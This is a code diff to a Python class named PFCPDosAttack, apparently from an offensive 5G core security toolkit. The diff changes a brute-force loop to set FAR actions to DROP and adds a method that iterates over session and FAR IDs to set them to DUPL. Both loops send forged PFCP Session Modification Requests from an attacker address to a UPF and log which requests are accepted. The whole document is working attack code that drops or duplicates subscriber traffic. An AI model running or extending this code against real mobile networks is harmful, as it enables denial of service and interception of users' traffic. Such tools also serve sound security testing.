@@ -589,7 +589,7 @@ class PFCPDosAttack:
         for seid in range(1, session_range):
             
             for farId in range(1, far_range):
-                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farId)
+                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farId, apply_action="DROP")
                 res = sr1(packet)
                 pfcp_cause = None
                 for ie in res[PFCP].IE_list:
@@ -599,4 +599,51 @@ class PFCPDosAttack:
                 
                 if pfcp_cause == 1:
                     self.logger.success(f"PFCP Session Modification Request accepted, SEID: {hex(seid)}, FAR_ID: {hex(farId)}")
+    
+    def Start_pfcp_session_modification_far_dupl_bruteforce(self, far_range, session_range, evil_addr=None, upf_addr=None, src_port=None, dest_port=None):
+        """
+        Launch a brute-force attack by sending PFCP Session Modification Requests targeting FARs.
+
+        Iterates over a range of SEIDs and FAR IDs, attempting to modify forwarding actions
+        and checking for successful responses from the UPF.
+
+        Args:
+            far_range (int): Number of FAR IDs to try for each SEID.
+            session_range (int): Number of SEIDs (sessions) to target.
+            evil_addr (str, optional): Source IPv4 address for the PFCP messages. Defaults to instance's evil_addr.
+            upf_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's upf_addr.
+            src_port (int, optional): UDP source port. Defaults to instance's src_port.
+            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.
+
+        Returns:
+            None
+        """
+
+        if not self.paramsHandler.check_parameters({
+            "far_range": far_range,
+            "session_range": session_range,
+            "evil_addr": evil_addr,
+            "upf_addr": upf_addr,
+            "src_port": src_port,
+            "dest_port": dest_port
+        }, "[Start_pfcp_session_modification_far_dupl_bruteforce]"):
+            return
+        
+        
+        PFCPToolkit_obj= PFCPToolkit(src_addr=evil_addr, dest_addr=upf_addr, src_port=src_port, dest_port=dest_port)
+        for seid in range(1, session_range):
+            
+            for farId in range(1, far_range):
+                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farId, apply_action="DUPL")
+                res = sr1(packet)
+                pfcp_cause = None
+                for ie in res[PFCP].IE_list:
+                    if isinstance(ie, IE_Cause):
+                        pfcp_cause = ie.cause
+                        break
+                
+                if pfcp_cause == 1:
+                    self.logger.success(f"PFCP Session Modification Request accepted, SEID: {hex(seid)}, FAR_ID: {hex(farId)}")
+    
+    
             
